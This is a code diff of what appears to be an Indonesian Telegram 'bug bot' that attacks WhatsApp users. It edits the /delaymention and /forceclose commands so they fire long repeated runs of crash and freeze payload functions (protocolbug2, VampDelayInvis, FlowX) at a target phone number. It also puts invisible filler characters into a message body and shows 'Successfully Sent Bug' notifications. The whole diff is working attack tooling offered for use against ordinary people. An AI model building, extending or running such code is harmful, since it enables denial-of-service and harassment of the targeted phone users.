@@ -631,7 +631,7 @@ async function FlowX(target) {
               hasMediaAttachment: false,
             },
             body: {
-              text: "puki",
+              text: " ㅤ ㅤ ㅤ ㅤ ㅤ",
             },
             nativeFlowMessage: {
               messageParamsJson: "",
@@ -1754,15 +1754,7 @@ async function VampOri(target) {
 
 }
 async function VampDelayInvis(target) {
-    for (let i = 0; i <= 800; i++) {
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
-    await VampBroadcast(target, mention = true)
+    for (let i = 0; i <= 5; i++) {
     await VampBroadcast(target, mention = true)
     }
 
@@ -2091,8 +2083,167 @@ bot.onText(/\/delaymention(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 
-    for (let i = 0; i < 1; i++) { // Kirim 3 kali langsung
-        await sendMessagesForDurationX(24, formatedNumber);
+    for (let i = 0; i < 10; i++) { // Kirim 3 kali langsung
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
     }
 
     // Kirim pesan setelah selesai dengan gambar lain
@@ -2106,7 +2257,7 @@ bot.onText(/\/delaymention(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 });
-bot.onText(/\/freze(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/\/frezyhge(?:\s(.+))?/, async (msg, match) => {
     const senderId = msg.from.id;
     const chatId = msg.chat.id;
 
@@ -2298,7 +2449,7 @@ bot.onText(/\/forceclose(?:\s(.+))?/, async (msg, match) => {
         return bot.sendMessage(chatId, "❌ Lu Siapa!!! Bukan Premium Mau Access Bot");
     }
     if (!match[1]) {
-        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number.\nExample: /system 62×××.");
+        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number.\nExample: /force x delay 62×××.");
     }
 
     const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
@@ -2317,7 +2468,144 @@ bot.onText(/\/forceclose(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 
-    for (let i = 0; i < 100; i++) { // Kirim 3 kali langsung
+    for (let i = 0; i < 10; i++) { // Kirim 3 kali langsung
+        await FlowX(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
+        await protocolbug2(formatedNumber);
+        await VampDelayInvis(formatedNumber);
         await FlowX(formatedNumber);
     }
 
@@ -2327,7 +2615,7 @@ bot.onText(/\/forceclose(?:\s(.+))?/, async (msg, match) => {
 ┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
 ┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
 ┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
-┃〢 Cᴏᴍᴍᴀɴᴅ : /system
+┃〢 Cᴏᴍᴍᴀɴᴅ : /force x delay 
 ┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 10 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
